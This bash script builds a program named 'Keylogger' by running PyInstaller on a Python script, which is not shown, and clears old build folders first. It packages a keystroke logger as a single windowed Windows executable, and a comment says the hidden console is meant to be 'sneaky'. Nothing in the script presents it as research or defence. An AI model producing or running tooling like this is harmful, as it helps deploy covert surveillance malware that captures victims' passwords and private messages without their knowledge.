#!/bin/bash
set -e

echo "--- Building Keylogger Executable Locally ---"

MAIN_SCRIPT="./script.py"
DIST_DIR="./dist"
EXECUTABLE_NAME="Keylogger"

# clean up previous builds
if [ -d "$DIST_DIR" ]; then
    echo "Cleaning up previous build directory: $DIST_DIR"
    rm -rf "$DIST_DIR"
fi
if [ -f "./Keylogger.spec" ]; then
    echo "Removing previous PyInstaller spec file..."
    rm "./Keylogger.spec"
fi
if [ -d "./build" ]; then
    echo "Cleaning up PyInstaller build cache..."
    rm -rf "./build"
fi

# run pyinstaller to create the executable
# --onefile: creates a single executable file
# --windowed or --noconsole: prevents the console window from appearing (sneaky sneaky)
# --name "${EXECUTABLE_NAME}": explicitly sets the output executable name
echo "Running PyInstaller on ${MAIN_SCRIPT} with name ${EXECUTABLE_NAME}.exe..."
pyinstaller --onefile --windowed --name "${EXECUTABLE_NAME}" "$MAIN_SCRIPT"

# verify
if [ ! -f "${DIST_DIR}/${EXECUTABLE_NAME}.exe" ]; then
    echo "Error: PyInstaller failed to create the executable."
    exit 1
fi

echo "Local build complete! Executable is located at ${DIST_DIR}/${EXECUTABLE_NAME}.exe"